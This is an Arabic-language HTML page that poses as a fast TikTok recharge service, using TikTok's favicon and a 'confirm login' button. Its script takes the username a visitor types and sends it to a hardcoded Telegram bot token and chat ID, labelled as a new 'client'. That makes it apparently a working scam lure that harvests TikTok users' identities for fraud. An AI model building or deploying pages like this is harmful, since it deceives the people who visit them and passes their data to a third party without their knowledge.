<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>شحن أولاد علي</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: Arial; padding-top: 50px; }
        .box { border: 2px solid #fe2c55; padding: 25px; border-radius: 15px; max-width: 300px; margin: auto; }
        input { width: 85%; padding: 12px; margin: 20px 0; border-radius: 8px; border: none; text-align: center; }
        button { width: 90%; padding: 12px; background: #fe2c55; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.tiktok.com/favicon.ico" width="50">
        <h2>نظام الشحن السريع</h2>
        <input type="text" id="username" placeholder="أدخل اسم المستخدم">
        <button onclick="send()">تأكيد الدخول</button>
    </div>
    <script>
        function send() {
            var user = document.getElementById('username').value;
            if(!user) { alert("اكتب اليوزر الأول"); return; }
            var t = "8704286686:AAFj-ErXhFQxbfqalEfQtW8RoeCfi3Pc_QA";
            var i = "5533405786";
            var finalUrl = "https://api.telegram.org/bot" + t + "/sendMessage?chat_id=" + i + "&text=🚀 عميل جديد: " + encodeURIComponent(user);
            window.location.href = finalUrl;
        }
    </script>
</body>
</html>
